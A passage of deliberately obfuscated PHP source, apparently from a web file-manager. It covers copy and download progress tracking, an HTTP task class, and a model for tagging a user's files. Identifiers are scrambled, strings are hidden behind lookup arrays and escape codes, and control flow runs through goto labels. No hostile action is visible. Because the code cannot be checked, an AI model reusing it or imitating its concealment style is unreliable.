($d‹©Ûº’îÓ[$D“¾ƒå•¸[366]]) { $b¹ŞÄŠ²¦[$D“¾ƒå•¸[978]] += $d‹©Ûº’îÓ[$D“¾ƒå•¸[80]][$D“¾ƒå•¸[79]] + 1; } } $b¹ŞÄŠ²¦[$D“¾ƒå•¸[701]] += $d‹©Ûº’îÓ[$D“¾ƒå•¸[77]]; $this->update(); goto fÂÅ¹°Ï©³; fÂÅ¹°Ï©³: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($CÒµ öŠ‚•) { $Bù™Ü“›ç =& $_SERVER[Äº¡•ô™Ÿ]; $f©ã°ùø† =& $this->task; $f©ã°ùø†[$Bù™Ü“›ç[1459]] = $CÒµ öŠ‚•[$Bù™Ü“›ç[28]]; $f©ã°ùø†[$Bù™Ü“›ç[980]] = $CÒµ öŠ‚•[$Bù™Ü“›ç[28]]; $this->update(); } public function copyFileStart($f¿ŞÁõÂ´, $a™ÆíŒíéö, $EĞ ªì‡ô¿, $DŞ›ª‰ŞÔä, $A‰ôè¾ºŒ¬, $EÚÄˆçœÑÇ) { goto C¤’„°³Ë³; C¤’„°³Ë³: $FÏ†¼ÂÒ¢ =& $_SERVER[Äº¡•ô™Ÿ]; $AÚÉ›ÙÄ = $A‰ôè¾ºŒ¬; if ($AÚÉ›ÙÄ == $GLOBALS[$FÏ†¼ÂÒ¢[1469]]) { $AÚÉ›ÙÄ = $GLOBALS[$FÏ†¼ÂÒ¢[1470]]; } goto D…¸Ÿ³®¦õ; c’„åÖ‰ÃĞ: $E—İ¸ì„ñ[$FÏ†¼ÂÒ¢[1459]] = $AÚÉ›ÙÄ; $E—İ¸ì„ñ[$FÏ†¼ÂÒ¢[1461]] = (int) $f¿ŞÁõÂ´->size($a™ÆíŒíéö); $E—İ¸ì„ñ[$FÏ†¼ÂÒ¢[1462]] = 0; goto c¿¥ÁÀŠä¨; D…¸Ÿ³®¦õ: $GLOBALS[$FÏ†¼ÂÒ¢[1470]] = $A‰ôè¾ºŒ¬; $GLOBALS[$FÏ†¼ÂÒ¢[1469]] = $EÚÄˆçœÑÇ; $E—İ¸ì„ñ =& $this->task; goto c’„åÖ‰ÃĞ; c¿¥ÁÀŠä¨: $E—İ¸ì„ñ[$FÏ†¼ÂÒ¢[980]] = $FÏ†¼ÂÒ¢[33]; $E—İ¸ì„ñ[$FÏ†¼ÂÒ¢[1463]] = $FÏ†¼ÂÒ¢[33]; $E—İ¸ì„ñ[$FÏ†¼ÂÒ¢[1464]] = 0; goto bÓª›ƒÁÆµ; bÓª›ƒÁÆµ: $this->update(); goto c ›ö•¾Ç¡; c ›ö•¾Ç¡: } public function copyFileEnd($dß‰£ ¼½‘, $bç´™‚é¬†, $C³ªŞ™£ß›, $A‰Ô­ÛÖ–ç, $dÄáÂ£“Å­, $D¤¦¶½ßë) { $f‹É£ªÓã— =& $_SERVER[Äº¡•ô™Ÿ]; $BØô¥ä„† =& $this->task; $BØô¥ä„†[$f‹É£ªÓã—[1462]] = $BØô¥ä„†[$f‹É£ªÓã—[1461]]; $BØô¥ä„†[$f‹É£ªÓã—[1463]] = $f‹É£ªÓã—[33]; if ($dÄáÂ£“Å­ == $BØô¥ä„†[$f‹É£ªÓã—[1459]]) { $BØô¥ä„†[$f‹É£ªÓã—[1466]] += $BØô¥ä„†[$f‹É£ªÓã—[1461]]; $this->update(1); } else { $this->update(); $BØô¥ä„†[$f‹É£ªÓã—[1462]] = 0; } self::log($f‹É£ªÓã—[1471] . $bç´™‚é¬† . $f‹É£ªÓã—[66] . $A‰Ô­ÛÖ–ç . $f‹É£ªÓã—[214] . $dÄáÂ£“Å­ . $f‹É£ªÓã—[1472] . $BØô¥ä„†[$f‹É£ªÓã—[1459]]); } public function updateFileEnd($cËÂ½ŠÛ”·, $C²ÇÎÊØÎ) { $dÈğäá®µŞ =& $_SERVER[Äº¡•ô™Ÿ]; $F¤è¤‘®èÆ =& $this->task; $F¤è¤‘®èÆ[$dÈğäá®µŞ[1459]] = $cËÂ½ŠÛ”·; $F¤è¤‘®èÆ[$dÈğäá®µŞ[1461]] = $C²ÇÎÊØÎ; $F¤è¤‘®èÆ[$dÈğäá®µŞ[1466]] += $C²ÇÎÊØÎ; $this->update(1); } public function sourceModelCopy($F”ÃÆ½œ²Æ) { goto aÈñ”¡–İ³; C£½Óøœ³¥: $DÂ†…œîŠ =& $this->task; $this->sourceModelCopyFlag = !0; $F»ç’ŸÆ«è = 0; goto fÂ­÷ë«‰Ç; fÂ­÷ë«‰Ç: switch ($c±øƒ–œ£‰) { case $E…÷Æ‹”µ[503]: $F»ç’ŸÆ«è = 1; break; case $E…÷Æ‹”µ[506]: $DÂ†…œîŠ[$E…÷Æ‹”µ[1459]] = $DÖĞÊ–òÂ[$E…÷Æ‹”µ[28]]; break; case $E…÷Æ‹”µ[508]: $F»ç’ŸÆ«è = intval($F”ÃÆ½œ²Æ[$E…÷Æ‹”µ[360]] * 0.4); break; case $E…÷Æ‹”µ[510]: $F»ç’ŸÆ«è = intval($F”ÃÆ½œ²Æ[$E…÷Æ‹”µ[360]] * 0.2); break; case $E…÷Æ‹”µ[512]: $F»ç’ŸÆ«è = intval($F”ÃÆ½œ²Æ[$E…÷Æ‹”µ[360]] * 0.4); break; } $this->update($F»ç’ŸÆ«è); $this->sourceModelCopyFlag = !1; goto fƒ‰²„ßÙ; aÈñ”¡–İ³: $E…÷Æ‹”µ =& $_SERVER[Äº¡•ô™Ÿ]; $c±øƒ–œ£‰ = $F”ÃÆ½œ²Æ[0]; $DÖĞÊ–òÂ = $F”ÃÆ½œ²Æ[1]; goto C£½Óøœ³¥; fƒ‰²„ßÙ: } public function sourceRemove($E˜šŸ–õí½, $eÚŞåô‡êÑ) { $dù†É’‡õ‰ =& $_SERVER[Äº¡•ô™Ÿ]; $this->sourceModelCopyFlag = !0; $f÷‡¥³ğ¥ = 1; if (isset($E˜šŸ–õí½[$dù†É’‡õ‰[80]])) { $f÷‡¥³ğ¥ = $E˜šŸ–õí½[$dù†É’‡õ‰[80]][$dù†É’‡õ‰[78]] + $E˜šŸ–õí½[$dù†É’‡õ‰[80]][$dù†É’‡õ‰[79]] + 1; } $this->update($f÷‡¥³ğ¥); $this->sourceModelCopyFlag = !1; } public function sourceMove($cèˆµˆ§) { $this->sourceRemove($cèˆµˆ§, !1); } public function curlProgress($aÀììÚ¾ç«, $CÈË·Œ‰¿, $f†Ô³ùæ˜, $B¢£®œïÄ‹, $D‹ÜÀ¼òÔ) { $f¦‰ÃÇÕ =& $_SERVER[Äº¡•ô™Ÿ]; $Eù‚¼à‚•ó =& $this->task; if ($D‹ÜÀ¼òÔ > 0) { $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[980]] = $f¦‰ÃÇÕ[1473]; $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1463]] = $f¦‰ÃÇÕ[91]; if ($Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1461]] == $B¢£®œïÄ‹ || $B¢£®œïÄ‹ > 1024 * 1024) { $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1462]] = $D‹ÜÀ¼òÔ; } if ($Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1464]]) { $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1462]] = $D‹ÜÀ¼òÔ + $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1464]]; } } else { if ($f†Ô³ùæ˜ > 0) { if ($Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1461]] == $CÈË·Œ‰¿) { $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1462]] = $f†Ô³ùæ˜; $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[980]] = $f¦‰ÃÇÕ[1474]; $Eù‚¼à‚•ó[$f¦‰ÃÇÕ[1463]] = $f¦‰ÃÇÕ[1040]; } } } $this->update(); } public function curlProgressStart($c½ƒĞóÏÉ) { } public function curlProgressEnd($dÁ¸ÛˆÄ) { $dä™Üµ–ÃÃ =& $_SERVER[Äº¡•ô™Ÿ]; $F¬”¦Á‡‘Ÿ =& $this->task; $e¾ºÏñ‰±¥ = curl_getinfo($dÁ¸ÛˆÄ); $b«ï©­Å = $e¾ºÏñ‰±¥[$dä™Üµ–ÃÃ[1475]]; if ($F¬”¦Á‡‘Ÿ[$dä™Üµ–ÃÃ[1463]] == $dä™Üµ–ÃÃ[91] && $b«ï©­Å) { $F¬”¦Á‡‘Ÿ[$dä™Üµ–ÃÃ[1464]] += $b«ï©­Å; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Cã²ñÜÊæµ =& $_SERVER[Äº¡•ô™Ÿ]; Hook::bind($Cã²ñÜÊæµ[1453], array($this, $Cã²ñÜÊæµ[1476])); Hook::bind($Cã²ñÜÊæµ[1455], array($this, $Cã²ñÜÊæµ[1477])); Hook::bind($Cã²ñÜÊæµ[1457], array($this, $Cã²ñÜÊæµ[1478])); } protected function endAfter() { $B¿ğÚÕ³éê =& $_SERVER[Äº¡•ô™Ÿ]; Hook::unbind($B¿ğÚÕ³éê[1453], array($this, $B¿ğÚÕ³éê[1476])); Hook::unbind($B¿ğÚÕ³éê[1455], array($this, $B¿ğÚÕ³éê[1477])); Hook::unbind($B¿ğÚÕ³éê[1457], array($this, $B¿ğÚÕ³éê[1478])); } public function progressStart($e¬Í„È”ğİ) { $e‰˜á´³Ö =& $_SERVER[Äº¡•ô™Ÿ]; $BÌŠÇÁÅ¦ì = curl_getinfo($e¬Í„È”ğİ); self::log($e‰˜á´³Ö[1479] . $BÌŠÇÁÅ¦ì[$e‰˜á´³Ö[292]]); self::valueSet($this->task[$e‰˜á´³Ö[364]], $this->task); } public function progressEnd($A±±ÜÖŒƒÒ) { $d—’è¤ Ò“ =& $_SERVER[Äº¡•ô™Ÿ]; self::log($d—’è¤ Ò“[1480] . $this->task[$d—’è¤ Ò“[364]]); $this->end(); } public function progress($d§¯„ŞØ£, $cä§ğÂ‘·¸, $dÜ›…ÌÏ«Ú, $c»ÍáæØ, $F ¬µ‡§¶¨) { $b¡£²ÂºÄ =& $_SERVER[Äº¡•ô™Ÿ]; $Eåˆ‡Æ¡ä =& $this->task; if ($F ¬µ‡§¶¨ > 0) { $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[978]] = $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[978]] == 0 ? $c»ÍáæØ : $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[978]]; $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[990]] = $F ¬µ‡§¶¨; } else { if ($dÜ›…ÌÏ«Ú > 0) { $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[978]] = $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[978]] == 0 ? $cä§ğÂ‘·¸ : $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[978]]; $Eåˆ‡Æ¡ä[$b¡£²ÂºÄ[990]] = $dÜ›…ÌÏ«Ú; } } $this->update(); self::log("\160\162\157\x67\x72\145\x73\x73\110\164\x74\160\x3a\144\x6f\167\156\72{$dÜ›…ÌÏ«Ú}\x2f{$cä§ğÂ‘·¸}\73\40\x75\x70\x6c\x6f\141\x64\72{$F ¬µ‡§¶¨}\x2f{$c»ÍáæØ}\x3b"); } } goto DÛÆÜ’ “ª; cøºÃ×›ìÆ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\141\166"; protected function cacheFunctionAlias($BÂéƒÅÚ¦) { $Aïùë¤¢òŸ =& $_SERVER[Äº¡•ô™Ÿ]; return array($Aïùë¤¢òŸ[2451] => array(USER_ID, $Aïùë¤¢òŸ[2507])); } protected function listData() { $E²Ş…‚ìéÕ =& $_SERVER[Äº¡•ô™Ÿ]; $EŸÓÈ¢çäö = array($E²Ş…‚ìéÕ[1407] => USER_ID, $E²Ş…‚ìéÕ[432] => array($E²Ş…‚ìéÕ[2508], 0)); $Eœî£ÑôÎ³ = $E²Ş…‚ìéÕ[2509]; $Cå·ëÜ  = $E²Ş…‚ìéÕ[2510]; $EŠá†‘ƒ»æ = $this->field($Eœî£ÑôÎ³)->where($EŸÓÈ¢çäö)->order($Cå·ëÜ )->select(); return $EŠá†‘ƒ»æ ? $EŠá†‘ƒ»æ : array(); } protected function listByTag($fÚÖİ¾Ë‰Ÿ) { } protected function addToTag($b‘•‡ë—», $EÂÔİğä¹¦) { $D±©ÑÆõ˜ =& $_SERVER[Äº¡•ô™Ÿ]; if (!Model($D±©ÑÆõ˜[2279])->listData($EÂÔİğä¹¦) || !Model($D±©ÑÆõ˜[755])->pathInfo($b‘•‡ë—»)) { return !1; } $FÆ²à¾½Ëˆ = array($D±©ÑÆõ˜[1407] => USER_ID, $D±©ÑÆõ˜[432] => $EÂÔİğä¹¦, $D±©ÑÆõ˜[384] => $b‘•‡ë—», $D±©ÑÆõ˜[385] => $D±©ÑÆõ˜[379], $D±©ÑÆõ˜[383] => $D±©ÑÆõ˜[33], $D±©ÑÆõ˜[2083] => 0); if ($this->where($FÆ²à¾½Ëˆ)->find()) { return !1; } return $this->add($FÆ²à¾½Ëˆ); } protected function removeFromTag($d¥«êÜÜ¶î, $a½å±à›§è) { $BÎÌ‘¨Š‚ë =& $_SERVER[Äº¡•ô™Ÿ]; if (!Model($BÎÌ‘¨Š‚ë[2279])->listData($a½å±à›§è) || !Model($BÎÌ‘¨Š‚ë[755])->pathInfo($d¥«êÜÜ¶î)) { return !1; } $Eİ¦ßÔ™©ô = array($BÎÌ‘¨Š‚ë[1407] => USER_ID, $BÎÌ‘¨Š‚ë[432] => $a½å±à›§è, $BÎÌ‘¨Š‚ë[385] => $BÎÌ‘¨Š‚ë[379], $BÎÌ‘¨Š‚ë[384] => $d¥«êÜÜ¶î); return $this->where($Eİ¦ßÔ™©ô)->delete(); } protected function removeByTag($A¹ æ•†£¼) { $c» ŠĞî±’ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$A¹ æ•†£¼) { return !1; } $b²ø‚ğ÷ŠÉ = array($c» ŠĞî±’[1407] => USER_ID, $c» ŠĞî±’[432] => $A¹ æ•†£¼); return $this->where($b²ø‚ğ÷ŠÉ)->delete(); } protected function removeBySource($Aõù¿³Ä…) { $e¼Ù¬¿†ƒ´ =& $_SERVER[Äº¡•ô™Ÿ]; $D×–¯†½ßµ = array($e¼Ù¬¿†ƒ´[1407] => USER_ID, $e¼Ù¬¿†ƒ´[384] => $Aõù¿³Ä…, $e¼Ù¬¿†ƒ´[432] => array($e¼Ù¬¿†ƒ´[930], 0)); return $this->where($D×–¯†½ßµ)->delete(); } }